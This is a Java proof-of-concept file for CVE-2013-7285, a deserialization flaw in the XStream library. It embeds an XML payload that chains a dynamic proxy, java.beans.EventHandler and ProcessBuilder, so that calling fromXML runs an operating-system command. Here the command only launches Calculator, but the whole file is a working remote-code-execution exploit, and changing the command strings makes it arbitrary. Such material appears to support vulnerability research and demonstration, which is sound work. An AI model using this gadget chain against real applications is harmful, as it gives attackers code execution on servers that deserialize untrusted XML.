package com.ocean;

import com.thoughtworks.xstream.XStream;

public class CVE_2013_7285_tree_map {
    public static void main(String[] args) {
        XStream xStream = new XStream();
        String xml = "<sorted-set>\n" +
                "  <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "    <handler class=\"java.beans.EventHandler\">\n" +
                "      <target class=\"java.lang.ProcessBuilder\">\n" +
                "        <command>\n" +
                "          <string>open</string>\n" +
                "          <string>-na</string>\n" +
                "          <string>Calculator</string>\n" +
                "        </command>\n" +
                "      </target>\n" +
                "      <action>start</action>\n" +
                "    </handler>\n" +
                "  </dynamic-proxy>\n" +
                "</sorted-set>";
        xStream.fromXML(xml);
    }
}
